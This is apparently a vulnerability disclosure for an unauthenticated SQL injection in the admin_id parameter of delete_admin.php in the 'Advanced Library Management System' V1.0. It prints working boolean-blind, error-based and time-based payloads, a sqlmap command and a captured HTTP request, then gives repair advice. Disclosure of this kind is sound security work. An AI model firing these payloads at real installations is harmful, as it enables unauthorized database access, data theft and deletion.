# Advanced Library Management System V1.0 delete_admin.php SQL injection

1. # NAME OF AFFECTED PRODUCT(S)

   - Advanced Library Management System

   ## Vendor Homepage

   - [Advanced Library Management System Project in PHP with Barcode | Projectworlds](https://projectworlds.com/advanced-library-management-system-project-in-php-with-barcode/)

   # AFFECTED AND/OR FIXED VERSION(S)

   ## submitter

   - xxxxx

   ## VERSION(S)

   - V1.0

   ## Software Link

   - [Advanced Library Management System Project in PHP with Barcode | Projectworlds](https://projectworlds.com/advanced-library-management-system-project-in-php-with-barcode/)

   # PROBLEM TYPE

   ## Vulnerability Type

   - SQL injection

   ## Root Cause

   - A SQL injection vulnerability was found in the 'delete_admin.php' file of the 'Advanced Library Management System' project. The reason for this issue is that attackers inject malicious code from the parameter "admin_id" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

   ## Impact

   - Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

   # DESCRIPTION

   - During the security review of "Advanced Library Management System", discovered a critical SQL injection vulnerability in the "delete_admin.php" file. This vulnerability stems from insufficient user input validation of the 'admin_id' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

   # No login or authorization is required to exploit this vulnerability

   # Vulnerability details and POC

   ## Vulnerability type:

   - time-based blind
   - boolean-based blind
   - error-based
   
   ## Vulnerability location:
   
   - 'admin_id' parameter
   
   ## Payload:
   
   ```
   Parameter: #1* (URI)
       Type: boolean-based blind
       Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
       Payload: http://10.151.168.204:8822/delete_admin.php?admin_id=1' AND 8019=(SELECT (CASE WHEN (8019=8019) THEN 8019 ELSE (SELECT 2517 UNION SELECT 2151) END))-- -
       Vector: AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))[GENERIC_SQL_COMMENT]
   
       Type: error-based
       Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
       Payload: http://10.151.168.204:8822/delete_admin.php?admin_id=1' AND GTID_SUBSET(CONCAT(0x71786a7671,(SELECT (ELT(1771=1771,1))),0x716a787171),1771)-- pyWL
       Vector: AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])
   
       Type: time-based blind
       Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
       Payload: http://10.151.168.204:8822/delete_admin.php?admin_id=1' AND (SELECT 1716 FROM (SELECT(SLEEP(5)))YPEy)-- XIyn
       Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
   ```
   
   ![image-20251103194152058](assets/image-20251103194152058.png)
   
   ## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
   
   ```
   python sqlmap.py -r data.txt --dbs -v 3 --batch --level 5
   //data.txt
   GET http://10.151.168.204:8822/delete_admin.php?admin_id=1* HTTP/1.1
   Host: 10.151.168.204:8822
   Cache-Control: max-age=0
   Origin: http://10.151.168.204:8822
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Referer: http://10.151.168.204:8822/borrow.php
   Accept-Encoding: gzip, deflate, br
   Accept-Language: zh-CN,zh;q=0.9
   Cookie: PHPSESSID=mvlvrc0vntapnir9lvu0knt0m8
   Connection: keep-alive
   ```
   
   # Attack results
   
   ![image-20251103194213045](assets/image-20251103194213045.png)
   
   # Suggested repair
   
   
   
   1. **Use prepared statements and parameter binding:** Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
   2. **Input validation and filtering:** Strictly validate and filter user input data to ensure it conforms to the expected format.
   3. **Minimize database user permissions:** Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
   4. **Regular security audits:** Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.